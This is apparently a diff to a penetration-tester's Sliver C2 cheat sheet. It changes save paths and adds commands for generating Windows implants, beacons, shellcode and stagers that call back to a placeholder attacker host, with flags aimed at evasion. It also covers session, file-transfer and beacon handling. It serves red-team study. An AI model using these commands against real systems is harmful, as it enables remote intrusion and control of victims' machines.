@@ -412,8 +412,8 @@ sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --sa
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
-sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /PATH/TO/BINARY
+sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /PATH/TO/BINARY -G
 sliver > generate stager --lhost <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
@@ -424,18 +424,23 @@ sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format servi
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
-sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /PATH/TO/BINARY
+sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /PATH/TO/BINARY -G
 sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /tmp/<FILE>.bin -G --skip-symbols
 ```
 
 ### Profile Handling
 
 ```c
-sliver (STALE_PNEUMONIA) > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe session_win_default
-sliver (STALE_PNEUMONIA) > profiles generate --save /PATH/TO/BINARY session_win_default
-sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default
-sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
+sliver > profiles new --mtls <LHOST> --format shellcode <PROFILE>
+sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE>
+sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --save /PATH/TO/BINARY
+```
+
+```c
+sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe <PROFILE>
+sliver > profiles generate --save /PATH/TO/BINARY <PROFILE>
+sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe --seconds 5 --jitter 3 <PROFILE>
 ```
 
 ### Common Commands, Implant and Beacon Handling
@@ -449,8 +454,11 @@ sliver > sessions                                                         // dis
 sliver > sessions -i <ID>                                                 // interact with a session
 sliver > use -i <ID>                                                      // interact with a session
 sliver > sessions -k <ID>                                                 // kill a session
-sliver > upload //PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY     // upload a file
+sliver > upload /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY      // upload a file
 sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
+sliver (NEARBY_LANGUAGE) > rename -n <NAME>                               // rename beacon
+sliver (NEARBY_LANGUAGE) > reconfig -i 30s -j 0s                          // reconfigure beacon
+sliver (NEARBY_LANGUAGE) > beacons prune                                  // remove lost beacons
 sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
 sliver (NEARBY_LANGUAGE) > tasks fetch 49ead4a9                           // fetch a specific task
 sliver (NEARBY_LANGUAGE) > info                                           // provide session information
